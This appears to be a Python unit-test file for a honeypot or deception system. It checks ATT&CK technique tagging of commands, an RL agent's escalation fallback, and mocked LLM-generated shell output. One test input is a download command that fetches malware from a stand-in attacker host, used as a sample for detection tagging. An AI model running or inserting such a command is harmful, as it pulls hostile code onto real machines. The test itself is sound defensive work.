import unittest
from rl_orchestrator import RLAgent
from ttp_mapper import map_command_to_ttpx
from llm_synthesizer import LLMSynthesizer

class TestAADEAdvancedLogic(unittest.TestCase):

    def test_ttp_mapping(self):
        tags = map_command_to_ttpx("ls -la /root")
        self.assertTrue(any(t['id'] == 'T1083' for t in tags))
        tags = map_command_to_ttpx("wget http://attacker.com/malware")
        self.assertTrue(any(t['id'] == 'T1105' for t in tags))

    def test_rl_fallback_logic(self):
        agent = RLAgent(model_path="non_existent.zip")
        # High risk should trigger escalation (action 1)
        action = agent.decide(num_cmds=10, max_ttp=5, duration=100, risk=90)
        self.assertEqual(action, 1)

    def test_llm_synthesis_logic(self):
        synth = LLMSynthesizer(provider="openai")
        output = synth.synthesize_output("ls", {"user": "root"})
        self.assertIn("Mocked", output)

if __name__ == '__main__':
    unittest.main()
